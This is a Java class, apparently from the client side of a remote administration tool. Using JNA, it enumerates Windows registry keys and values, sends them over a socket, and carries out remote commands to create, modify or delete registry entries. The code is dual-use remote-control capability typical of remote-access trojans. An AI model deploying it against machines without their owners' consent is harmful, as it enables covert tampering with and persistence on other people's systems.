package me.client.send;

import com.sun.jna.platform.win32.Advapi32;
import com.sun.jna.platform.win32.Advapi32Util;
import com.sun.jna.platform.win32.WinReg;
import com.sun.jna.ptr.IntByReference;
import me.client.utils.MessageFlags;
import me.client.utils.SendMessage;
import oshi.jna.platform.windows.WinNT;

import java.io.UnsupportedEncodingException;
import java.net.Socket;

public class RegisterManager {
    Socket socket;
    public RegisterManager(Socket socket) {
        this.socket = socket;
    }
    public void regQuery(int hkey, String keyString) throws UnsupportedEncodingException {
        char[] string = new char[WinNT.MAX_PATH];
        byte[] bytes = new byte[1024];
        String str = null;
        WinReg.HKEYByReference hkeyByReference = new WinReg.HKEYByReference();
        IntByReference intByReference = new IntByReference(WinNT.MAX_PATH);
        IntByReference intByReference1 = new IntByReference();
        IntByReference intByReference2 = new IntByReference(1024);
        int value;
        int value1 = 0;
        int key;
        int key1 = 0;
        Advapi32.INSTANCE.RegOpenKeyEx(new WinReg.HKEY(hkey),keyString,0,WinNT.KEY_READ,hkeyByReference);
        while (Advapi32.INSTANCE.RegEnumKeyEx(hkeyByReference.getValue(), key1++, string, intByReference, null, null, null, null) != com.sun.jna.platform.win32.WinNT.ERROR_NO_MORE_ITEMS) {
            intByReference = new IntByReference(WinNT.MAX_PATH);
            String temp = new String(string);
            str = temp.substring(0, temp.indexOf("\0"));
            SendMessage.send(MessageFlags.REGIDTER_QUERY_KEY, str.getBytes( "GBK"), socket);
        }
        while (Advapi32.INSTANCE.RegEnumValue(hkeyByReference.getValue(), value1++, string, intByReference, null, intByReference1, bytes, intByReference2) != com.sun.jna.platform.win32.WinNT.ERROR_NO_MORE_ITEMS) {
            intByReference2 = new IntByReference(100);
            intByReference = new IntByReference(WinNT.MAX_PATH);
            String temp = String.valueOf(string);
            str = temp.substring(0, temp.indexOf("\0"));
            String type = getType(intByReference1.getValue());
            Object values = getValue(hkey, keyString, str);
            String strings = str + "|" + type + "|" + values;
            SendMessage.send(MessageFlags.REGIDTER_QUERY_VALUE,strings.getBytes("GBK"),socket);
        }
        Advapi32.INSTANCE.RegCloseKey(hkeyByReference.getValue());
    }
    private Object getValue(int hkey,String path,String value) {
        Object obj = Advapi32Util.registryGetValue(new WinReg.HKEY(hkey),path,value);
        return obj;
    }
    public void deleteValue(int hkey,String path,String value) throws UnsupportedEncodingException {
        Advapi32Util.registryDeleteValue(new WinReg.HKEY(hkey),path,value);
        regQuery(hkey,path);
    }
    public void deleteKey(int hkey,String path) throws UnsupportedEncodingException {
        Advapi32Util.registryDeleteKey(new WinReg.HKEY(hkey),path);
        String lastPath = path.substring(0,path.lastIndexOf("\\"));
        regQuery(hkey,lastPath);
    }
    public void createValue(int hkey,String path,String newValue,String type) throws UnsupportedEncodingException {
        switch (type) {
            case "REG_DWORD":
                Advapi32Util.registrySetLongValue(new WinReg.HKEY(hkey),path, newValue,0);
            break;
            case "REG_EXPAND_SZ":
                Advapi32Util.registrySetExpandableStringValue(new WinReg.HKEY(hkey),path,newValue," ");
                break;
            case "REG_SZ":
                Advapi32Util.registrySetStringValue(new WinReg.HKEY(hkey),path,newValue," ");
                break;
        }
        regQuery(hkey,path);
    }
    public void createKey(int hkey,String path,String newKey) throws UnsupportedEncodingException {
        Advapi32Util.registryCreateKey(new WinReg.HKEY(hkey),path,newKey);
        regQuery(hkey,path);
    }
    public void setValue(int hkey,String path,String value,String setValue,String type) throws UnsupportedEncodingException {
        switch (type) {
            case "REG_BINARY":
                SendMessage.sendHead(MessageFlags.REGIDTER_ERROR,socket);
                break;
            case "REG_DWORD":
                Advapi32Util.registrySetLongValue(new WinReg.HKEY(hkey),path,value,Integer.parseInt(setValue));
                break;
            case "REG_EXPAND_SZ":
                Advapi32Util.registrySetExpandableStringValue(new WinReg.HKEY(hkey),path,value,setValue);
                break;
            case "REG_LINK":
                SendMessage.sendHead(MessageFlags.REGIDTER_ERROR,socket);
                break;
            case "REG_SZ":
                Advapi32Util.registrySetStringValue(new WinReg.HKEY(hkey),path,value,setValue);
                break;
            case "REG_MULTI_SZ":
                SendMessage.sendHead(MessageFlags.REGIDTER_ERROR,socket);
                break;
            case "REG_NONE":
                SendMessage.sendHead(MessageFlags.REGIDTER_ERROR,socket);
                break;
        }
        regQuery(hkey,path);
    }
    private String getType(int i){
        String type = null;
        switch (i) {
            case WinNT.REG_BINARY:
                type = "REG_BINARY";
                break;
            case WinNT.REG_DWORD:
                type = "REG_DWORD";
                break;
            case WinNT.REG_EXPAND_SZ:
                type = "REG_EXPAND_SZ";
                break;
            case WinNT.REG_LINK:
                type = "REG_LINK";
                break;
            case WinNT.REG_SZ:
                type = "REG_SZ";
                break;
            case WinNT.REG_MULTI_SZ:
                type = "REG_MULTI_SZ";
                break;
            case WinNT.REG_NONE:
                type = "REG_NONE";
                break;
        }
        return type;
    }
}